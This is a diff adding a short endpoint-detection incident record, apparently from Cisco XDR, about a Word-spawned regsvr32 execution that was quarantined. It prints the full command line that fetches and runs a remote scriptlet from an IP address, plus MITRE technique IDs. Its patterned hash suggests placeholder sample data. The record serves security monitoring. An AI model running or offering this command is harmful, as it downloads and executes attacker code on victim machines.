@@ -1,0 +1,20 @@
+Cisco XDR Incident
+Detection Time: 2026-07-20T09:12:31Z
+Host: EMEA-LT-018
+User: j.miller
+Detection: Suspicious LOLBAS Activity
+Threat Name: Win.Trojan.RegsvrRunner
+Parent Process: winword.exe
+Process: regsvr32.exe
+Command Line: regsvr32.exe /s /n /u /i:https://185.142.223.12/payload.sct scrobj.dll
+File: C:\Users\j.miller\AppData\Local\Temp\payload.sct
+SHA256: 7a1c4f8e9b0d2e3f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f
+Action: Quarantined
+
+MITRE: T1218 T1218.010 T1027
+
+References:
+https://secureboard.cisco.com/case/CS-9124
+https://www.virustotal.com/gui/file/7a1c4f8e9b0d2e3f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f
+https://attack.mitre.org/techniques/T1218/010/
+Attacker URL: https://185.142.223.12/payload.sct
